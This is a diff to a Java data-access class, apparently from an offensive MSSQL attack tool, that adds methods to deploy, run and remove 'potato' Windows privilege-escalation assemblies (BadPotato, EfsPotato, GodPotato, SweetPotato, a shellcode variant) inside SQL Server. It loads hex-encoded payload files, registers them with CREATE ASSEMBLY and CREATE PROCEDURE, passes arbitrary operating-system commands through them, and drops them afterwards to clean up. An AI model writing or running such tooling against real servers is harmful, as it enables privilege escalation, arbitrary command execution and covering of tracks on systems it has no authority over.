@@ -605,4 +605,137 @@ public class MssqlDao {
     public String getConnectionUrl() {
         return JDBCURL;
     }
+
+    // ---- potato 系提权族（M3a Keep 项，D12：仿 createCLRFunc→clrruncmd 管道新写；Extend 1.3.1 对齐） ----
+
+    /** kind → 本地 hex 资产文件名（Plugins/Mssql/<file>，随发布 zip 分发） */
+    public static String potatoAsset(String kind) {
+        switch (kind) {
+            case "badpotato": return "badpotato.txt";
+            case "efspotato": return "efspotato.txt";
+            case "efspotato_shellcode": return "efspotato_shellcode.txt";
+            case "godpotato": return "godpotato.txt";
+            case "sweetpotato": return "sweetpotato.txt";
+            default: throw new IllegalArgumentException("未知 potato kind: " + kind);
+        }
+    }
+
+    /** 探测对应 potato 程序集是否已部署（与 checkCLR 同款语义） */
+    public boolean checkPotatoFunc(String kind) {
+        try {
+            String sql;
+            switch (kind) {
+                case "badpotato": sql = MssqlSqlUtil.checkBadpotatoSql; break;
+                case "efspotato": sql = MssqlSqlUtil.checkEfsPotatoSql; break;
+                case "efspotato_shellcode": sql = MssqlSqlUtil.checkEfsPotatoSSql; break;
+                case "godpotato": sql = MssqlSqlUtil.checkGodPotatoSql; break;
+                case "sweetpotato": sql = MssqlSqlUtil.checkSweetPotatoSql; break;
+                default: return false;
+            }
+            String c1 = excute(sql, "");
+            return !"-1".equals(c1);
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    /** 部署：读 hex 资产 → CREATE ASSEMBLY → CREATE PROCEDURE（需 CLR 已启用，调用方先走 kitmain 链） */
+    public boolean createPotatoFunc(String kind) {
+        try {
+            String createAssembly;
+            String createProc;
+            switch (kind) {
+                case "badpotato":
+                    createAssembly = MssqlSqlUtil.CreateBadpotatoSql;
+                    createProc = MssqlSqlUtil.createBadpotatoFSql;
+                    break;
+                case "efspotato":
+                    createAssembly = MssqlSqlUtil.CreateEfsPotatoSql;
+                    createProc = MssqlSqlUtil.createEfsPotatoFSql;
+                    break;
+                case "efspotato_shellcode":
+                    createAssembly = MssqlSqlUtil.CreateEfsPotatoSSql;
+                    createProc = MssqlSqlUtil.createEfsPotatoSFSql;
+                    break;
+                case "godpotato":
+                    createAssembly = MssqlSqlUtil.CreateGodPotatoSql;
+                    createProc = MssqlSqlUtil.createGodPotatoFSql;
+                    break;
+                case "sweetpotato":
+                    createAssembly = MssqlSqlUtil.CreateSweetPotatoSql;
+                    createProc = MssqlSqlUtil.createSweetPotatoFSql;
+                    break;
+                default:
+                    return false;
+            }
+            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mssql"
+                    + File.separator + potatoAsset(kind);
+            String contents = Utils.readFile(path).replace("\n", "");
+            excute(String.format(createAssembly, contents), "");
+            excute(createProc, "");
+            reporter.log(Utils.log("创建 " + kind + " 函数成功！"));
+            return true;
+        } catch (Exception e) {
+            reporter.error(e.getMessage(), e);
+            return false;
+        }
+    }
+
+    /** 执行：exec kitX '<cmd>'（efspotato_shellcode 模板双参，Extend 同款以命令占两槽） */
+    public String runPotatoCmd(String kind, String command, String code) {
+        String res = "";
+        command = command.replace("'", "''");
+        try {
+            String sql;
+            switch (kind) {
+                case "badpotato": sql = String.format(MssqlSqlUtil.clrbadpotatoSql, command); break;
+                case "efspotato": sql = String.format(MssqlSqlUtil.clrEfsPotatoSql, command); break;
+                case "efspotato_shellcode": sql = String.format(MssqlSqlUtil.clrEfsPotatoSSql, command, command); break;
+                case "godpotato": sql = String.format(MssqlSqlUtil.clrGodPotatoSql, command); break;
+                case "sweetpotato": sql = String.format(MssqlSqlUtil.clrSweetPotatoSql, command); break;
+                default: return res;
+            }
+            res = excute(sql, code);
+        } catch (Exception e) {
+            reporter.error(e.getMessage(), e);
+        }
+        return res;
+    }
+
+    /** 卸载单 kind：drop proc + drop assembly（recovery/clean 用） */
+    public boolean closePotatoFunc(String kind) {
+        String sql;
+        switch (kind) {
+            case "badpotato": sql = MssqlSqlUtil.closeBadpotatoSql; break;
+            case "efspotato": sql = MssqlSqlUtil.closeEfsPotatoSql; break;
+            case "efspotato_shellcode": sql = MssqlSqlUtil.closeEfsPotatoSSql; break;
+            case "godpotato": sql = MssqlSqlUtil.closeGodPotatoSql; break;
+            case "sweetpotato": sql = MssqlSqlUtil.closeSweetPotatoSql; break;
+            default: return false;
+        }
+        try {
+            for (String part : sql.split("\\n")) {
+                if (part.trim().isEmpty()) {
+                    continue;
+                }
+                try {
+                    excute(part, "");
+                } catch (Exception ignore) {
+                    // 逐句容错（与 recoveryAll 同风格）
+                }
+            }
+            return true;
+        } catch (Exception e) {
+            reporter.error(e.getMessage(), e);
+            return false;
+        }
+    }
+
+    /** 全部 potato 组件卸载（recovery 扩展） */
+    public void closeAllPotato() {
+        for (String k : new String[]{"badpotato", "efspotato", "efspotato_shellcode", "godpotato", "sweetpotato"}) {
+            closePotatoFunc(k);
+        }
+        reporter.log(Utils.log("potato 系组件卸载完成"));
+    }
 }
